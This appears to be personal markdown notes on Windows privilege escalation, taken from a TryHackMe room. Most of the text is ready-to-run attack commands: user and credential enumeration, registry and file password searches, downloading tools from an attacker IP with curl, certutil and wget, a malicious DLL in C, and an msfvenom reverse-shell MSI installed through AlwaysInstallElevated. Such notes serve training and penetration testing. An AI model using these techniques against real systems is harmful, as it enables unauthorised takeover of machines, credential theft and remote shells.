Windows Privilege Escalation
===
## Source: https://tryhackme.com/room/winprivesc

## RDP Source: https://miloserdov.org/?p=4516
```shell
xfreerdp` `/u``:Tester` `/p``:1234` `/v``:192.168.0.101
```
Typical Windows methodology:
1.  Enumerate the current user's privileges and resources it can access.
2.  If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1
3.  If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach (e.g. manually go over a checklist like the one provided [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md))

## Information Gathering
### User Enumeration
```powershell
whoami /priv (current user privileges)
net users (list users)
net user username (list details of user)
net user Administrator
quinsta (other users logged in simultaneously)
query session (as above)
net localgroup (user groups defined on system)
net localgroup groupname (list members of a specific group)
net localgroup Administrators
```

### System Info
Get an overview of the system:
```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
```
findstr is grep equivalent

### Searching files
The `findstr` command can be used to find such files in a format similar to the one given below:
`findstr /si password *.txt`

`findstr`: Searches for patterns of text in files.

`/si`: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)

`password`: The command will search for the string “password” in files

`*.txt`: The search will cover files that have a .txt extension
Extensions to check include txt, xml, ini, config and xls

### Patch level
A missing critical patch can lead to priv esc.
`wmic qfe get Caption,Description,HotFixID,InstalledOn`

WMIC is a CLI interface to Windows Management Instrumentation (WMI). WMIC is deprecated, user WMI PowerShell cmdlet.

### Network connections
```powershell
netstat -ano
```
Breakdown:
-   `-a`: Displays all active connections and listening ports on the target system.
-   `-n`: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-   `-o`: Displays the process ID using each listed connection.

Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential **local** service.

If you discover such a service you can try port forwarding to connect and exploit.

### Scheduled tasks
`schtasks /query /fo LIST /v`

### Drivers
`driverquery`
Online research to see if discovered drivers present priv esc vuln.

### Antivirus
Query for Windows Defender:
`sc query windefend`

Overwhelming output, but if you do not know the service name of the antivirus:
`sc queryex type=service`

## Tools
### WinPEAS
Script for enumeration, detected and blocked by Windows Defender. A lot of output so redirect it to a file:
```powershell
winpeas.exe > outputfile.txt
```
Available at: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

From windows shell:
```bash
powershell -c "curl http://10.2.112.113/winpeas.exe -OutFile winpeas.exe"
```
It is not actually curl but an alias for similar hence -OutFile is weird.
### PowerUphttps://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
`Invoke-AllChecks` for all checks
`Get-UnquotedService` e.g of a specific check
Available at: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
**Reminder**: To run PowerUp on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can launch PowerShell using the command below.
```cmd
powershell.exe -nop -exec bypass
```

Raw file to wget:
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Struggled to get this firing in metsploit, eventually works: (from PS > )
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

### Windows Exploit Suggester
A python script available at: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
Runs on attacking system, could be useful to avoid AV.
First run update:
```shell
windows-exploit-suggester.py -update
```
Second, run `systeminfo` on the target, direct the output to a file and move the file to the attacking box.
`windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt`
A newer version of WES is available here: https://github.com/bitsadmin/wesng depending on the target this may work better.

### Metasploit
If you already have a meterpreter shell run `multi/recon/local_exploit_suggester` to list vulns that may lead to priv esc.

## Vulnerable Software
Info on all installed software:
```shell
wmic product
```
Filter output:
```shell
wmic product get name,version,vendor
```
32 bit software running on 64 bit sys may not show.
`wmic service list brief`
Check running services to have a better understanding of the target.
The above is overwhelming, grep with:
`wmic service list brief | findstr  "Running"`
For more info on any service run `sc qc service`

Based on the research above:
1.  Searchsploit
2.  Metasploit
3.  Exploit-DB
4.  Github
5.  Google

**always read unverified exploits for malicous code**

## DLL Hijacking
Dynamic Link Libraries store additonal functions that support the .exe. You cannot run them directly. 

DLL search order: https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order

If **SafeDllSearchMode** is enabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
4.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
5.  The current directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

If **SafeDllSearchMode** is disabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The current directory.
3.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
5.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Maybe we can write to one of the above (if the app can't find the legit one first).

### Find DLL hijacking vulns
Install Process Monitor (ProcMon). This needs admin rights so would have to be done on a test system.

### Creating a malicious DLL file
Boliderplate:
```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```
The above will execute whoami and save the output to dll.txt.
You need the Mingw compilter, install:
```shell
apt install gcc-mingw-w64-x86-64
```
And compile:
```shell
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```
Now, to get the malicious dll from attack box to target, use the following PowerShell command: (on the target after running a python web server on attack)
```powershell
wget -O hijackme.dll 10.2.112.113:8080/hijackme.dll
```
Start and stop dllsvc service:
```shell
sc stop dllsvc & sc start dllsvc
```
## Unquoted Service Path
If a service path is unquoted e.g. 
```shell
c:\program file\something else\srve.exe
```
Windows will look first for program.exe, then something.exe etc.

### Finding them
`wmic service get name,displayname,pathname,startmode`
list all running services

Check the binary path of a found service "unquotedsvc"
`sc qc unquotedsvc`

Now check our priveleges on the path:
`.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`

## Quick Wins (probably only CTF related)
### Scheduled tasks
```shell
schtasks
```
Look for tasks that have lost their binary or use a binary you can modify. The task should be set to run with a privilege higher than current.

Can also upload Autoruns64.exe.

### AlwasyInstallElevated
If set we can generate a malicious .msi file.

These two registry values need to be set:
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

Generate a malicious .msi:
`msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

Run Metasploit handler to catch the shell

Then on target:
```shell-session
C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Passwords
Look for cleartext passwords.
The find method above^^

List saved creds:
```shell
cmdkey /list
```
If you see any from the above command use `runas` and `/savecred`
`runas /savecred /user:admin reverse_shell.exe`

**Registry keys:** Registry keys potentially containing passwords can be queried using the commands below.  
```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Unattend files:** Unattend.xml files helps system administrators setting up Windows systems. They need to be deleted once the setup is complete but can sometimes be forgotten on the system. What you will find in the unattend.xml file can be different according to the setup that was done. If you can find them on a system, they are worth reading.

## Finding files on Windows
```shell
dir root.txt /s /p
```

## Downloading files from cmd
```bash
certutil.exe -urlcache -split -f "http://10.2.112.113:8000/PostView.ascx" PostView.ascx
```
Using powershell:
```bash
powershell -c "curl http://10.2.112.113/winpeas.exe -OutFile winpeas.exe"
```

## Run an exe from cmd
```bash
start shell.exe
```
